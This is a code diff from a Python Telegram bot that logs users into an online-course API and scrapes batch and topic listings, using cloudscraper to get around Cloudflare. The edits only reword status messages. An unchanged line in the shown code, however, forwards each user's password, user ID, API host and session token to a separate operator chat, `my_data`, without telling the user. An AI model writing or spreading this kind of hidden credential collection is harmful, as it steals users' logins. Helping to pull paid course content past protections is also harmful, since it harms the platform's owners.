@@ -124,8 +124,7 @@ async def start(bot, m):
             print(aa)
             cool = ""
         cool += aa
-    await editable.edit(f"Login successfull....✅⚙️")
-    editable1 = await bot.send_message(m.chat.id, f"Login Success..\n\n{cool}\nSend ID:")
+    editable1 = await bot.send_message(m.chat.id, f"Login successfull....✅\n\n**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
     await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}")
     #await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
     input1 = await bot.listen(editable.chat.id)
@@ -144,7 +143,7 @@ async def start(bot, m):
     for topic in topicid:
         tids = topic["subjectid"]
         subject_title = topic["subject_name"].replace(':', '')
-        await editable1.edit(f"Extracting....♻️**{subject_title}** please wait patiently📥")
+        await editable1.edit(f"Extracting Data From ♻️ **{subject_title}** Please Wait Patiently 🔰 📥")
         scraper = cloudscraper.create_scraper()
         html4 = scraper.get("https://"+raw_text05+"/get/alltopicfrmlivecourseclass?courseid=" + raw_text1 + "&subjectid=" + tids, headers=hdr).content
         output4 = json.loads(html4)
